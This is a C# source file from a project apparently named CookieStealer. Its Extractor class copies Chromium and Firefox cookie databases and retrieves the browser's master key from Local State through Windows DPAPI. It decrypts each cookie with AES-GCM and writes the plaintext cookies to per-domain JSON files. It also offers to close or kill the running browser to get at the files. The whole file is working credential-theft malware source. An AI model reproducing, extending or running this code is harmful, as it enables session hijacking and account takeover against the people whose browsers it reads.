using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json.Serialization;
using Microsoft.Data.Sqlite;
using Newtonsoft.Json;
using JsonSerializer = System.Text.Json.JsonSerializer;

namespace CookieStealer.Utilities;

public class Extractor
{
    private class LocalStateDto
    {
        [JsonPropertyName("os_crypt")] public OsCrypt? OsCrypt { get; set; }
    }

    private class OsCrypt
    {
        public OsCrypt(string? encryptedKey)
        {
            EncryptedKey = encryptedKey;
        }

        [JsonPropertyName("encrypted_key")] public string? EncryptedKey { get; }
    }

    private readonly Dictionary<string, BrowserInfo> _browsers = new BrowserData().Browsers;
    private readonly string _workingDirectory;
    private readonly string _userDomainName = Environment.UserDomainName;
    private readonly string _userName = Environment.UserName;


    public Extractor()
    {
        var now = DateTime.Now;
        var currentTime = now.ToString("ddMMyyHHmm");

        _workingDirectory = @$"extracted\{_userDomainName}\{_userName}\{currentTime}";

        foreach (
            var path in from browser in _browsers
            let path = @$"{_workingDirectory}\{browser.Key}\database"
            where browser.Value.Exists
            select path
        )
        {
            Directory.CreateDirectory(path);
        }
    }


    public void GrabAndRun()
    {
        foreach (var browser in _browsers)
        {
            var currentDirectory = Path.Combine(_workingDirectory, browser.Key, "database");
            var cookiePath = browser.Value.PathToCookiesFile;

            if (browser.Value.NeedDecryption)
            {
                var key = GetKey(browser.Value.PathToLocalState);
                File.WriteAllBytes($"{currentDirectory}\\master.key", key);
            }

            try
            {
                File.Copy(cookiePath, currentDirectory + "\\Cookies");
            }
            catch (IOException)
            {
                Console.WriteLine(
                    $"Can't copy Cookies file because browser is currently running. Do you want to terminate {browser.Key}? [Y/N]");
                var ans1 = Console.ReadKey();

                switch (ans1.KeyChar)
                {
                    case 'y':
                        Console.Clear();
                        var processes = Process.GetProcessesByName(browser.Key.ToLower());

                        foreach (var process in processes)
                        {
                            process.CloseMainWindow();
                            if (!process.WaitForExit(3000))
                            {
                                Console.WriteLine($"Couldn't terminate the process. Do you want to kill {browser.Key}? [Y/N]");
                                var ans2 = Console.ReadKey();

                                switch (ans2.KeyChar)
                                {
                                    case 'y':
                                        Console.Clear();
                                        process.Kill();
                                        Thread.Sleep(500);
                                        break;
                                    case 'n':
                                        break;
                                }
                            }
                        }

                        File.Copy(cookiePath, currentDirectory + "\\Cookies");
                        break;

                    case 'n':
                        Console.Clear();
                        break;
                }
            }
        }
    }

    private static byte[] GetKey(string? localStatePath)
    {
        var localStateContent = File.ReadAllText(localStatePath);
        var localState = JsonSerializer.Deserialize<LocalStateDto>(localStateContent);
        var encryptedKey = localState?.OsCrypt?.EncryptedKey;

        var keyWithPrefix = Convert.FromBase64String(encryptedKey);
        var key = keyWithPrefix[5..];
        byte[] masterKey;
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            masterKey = ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
        }
        else
        {
            Environment.Exit(1);
            return null;
        }
        return masterKey;
    }

    public void DecryptAndExtract()
    {
        foreach (var browser in _browsers)
        {
            var currentDirectory = Path.Combine(_workingDirectory, browser.Key, "database");

            var dbFileName = Path.Combine(currentDirectory, "Cookies");
            File.Copy(dbFileName, dbFileName + ".bak");

            if (browser.Value.NeedDecryption)
            {
                var key = File.ReadAllBytes(currentDirectory + "\\master.key");
                Console.Write($"Decrypting {browser.Key} cookies... ");
                DecryptDb(dbFileName, key);
                Console.WriteLine("Done.");
            }

            ExtractCookies(currentDirectory, currentDirectory + "\\..", browser.Key);
        }
    }

    private static void DecryptDb(string cookiesPath, byte[] key)
    {
        using var connection = new SqliteConnection($"Data Source={cookiesPath}");
        connection.Open();

        var command = connection.CreateCommand();
        command.CommandText =
            """
            SELECT *
            FROM cookies
            """;

        var countCommand = connection.CreateCommand();
        countCommand.CommandText =
            """
            SELECT COUNT(*)
            FROM cookies
            """;
        var totalRows = Convert.ToInt32(countCommand.ExecuteScalar());
        
        using (var progress = new ProgressBar())
        {
            using var reader = command.ExecuteReader();

            while (reader.Read())
            {
                var i = 1;
                var name = reader["name"].ToString();
                if (string.IsNullOrEmpty(name))
                {
                    continue;
                }

                var encryptedValue = (byte[])reader["encrypted_value"];
                var creationUtc = reader["creation_utc"].ToString();

                var value = DecryptCookie(key, encryptedValue);

                using var updateCommand = connection.CreateCommand();
                updateCommand.CommandText =
                    """
                    UPDATE cookies
                    SET value = $value
                    WHERE creation_utc = $creation_utc
                    """;
                updateCommand.Parameters.AddWithValue("$value", value);
                updateCommand.Parameters.AddWithValue("$creation_utc", creationUtc);
                updateCommand.ExecuteNonQuery();

                i++;
                progress.Report((double)i / totalRows);
            }
        }
    }

    private static string DecryptCookie(byte[] masterKey, byte[] cookie)
    {
        var nonce = cookie[3..15];
        var ciphertext = cookie[15..^16];
        var tag = cookie[^16..(cookie.Length)];

        var resultBytes = new byte[ciphertext.Length];

        using var aesGcm = new AesGcm(masterKey);
        aesGcm.Decrypt(nonce, ciphertext, tag, resultBytes);
        var cookieValue = Encoding.UTF8.GetString(resultBytes);
        return cookieValue;
    }


    private static void ExtractCookies(string cookiesPath, string extractionPath, string browserName)
    {
        using var connection = new SqliteConnection($"Data Source={cookiesPath + "\\Cookies"}");
        connection.Open();

        var command = connection.CreateCommand();
        command.CommandText = browserName != "Firefox"
            ? """
              SELECT host_key as domain,
                     expires_utc as expirationDate,
                     host_key as hostOnly,
                     is_httponly as httpOnly,
                     name,
                     path,
                     samesite as sameSite,
                     is_secure as secure,
                     is_persistent as session,
                     null as storeID,
                     value
              FROM cookies
              """
            : """
              SELECT host as domain,
                     expiry as expirationDate,
                     host as hostOnly,
                     isHttpOnly as httpOnly,
                     name,
                     path,
                     sameSite,
                     isSecure as secure,
                     true as session,
                     null as storeID,
                     value
              FROM moz_cookies
              """;

        var cookies = new Dictionary<string, List<dynamic>>();
        using var reader = command.ExecuteReader();
        while (reader.Read())
        {
            var cookie = new
            {
                domain = reader["domain"].ToString(),
                expirationDate = browserName != "Firefox"
                    ? Translator.ConvertExpiresUtcToExpirationDate(Convert.ToDecimal(reader["expirationDate"]))
                    : reader["expirationDate"],
                hostOnly = Translator.HostOnly(reader["hostOnly"].ToString()),
                httpOnly = Convert.ToBoolean(reader["httpOnly"]),
                name = reader["name"].ToString(),
                path = reader["path"].ToString(),
                sameSite = Translator.SameSite(Convert.ToInt16(reader["sameSite"])),
                secure = Convert.ToBoolean(reader["secure"]),
                session = Convert.ToBoolean(reader["session"]),
                storeID = reader["storeID"],
                value = reader["value"].ToString()
            };

            var domain = Translator.FileName(cookie.domain);
            if (!cookies.ContainsKey(domain))
            {
                cookies[domain] = new List<dynamic>();
            }

            cookies[domain].Add(cookie);
        }

        foreach (var domain in cookies.Keys)
        {
            var json = JsonConvert
                .SerializeObject(cookies[domain], Formatting.Indented);
            var path = Path.Combine(extractionPath, $"{domain}.json");
            File.WriteAllText(path, json);
        }
    }
}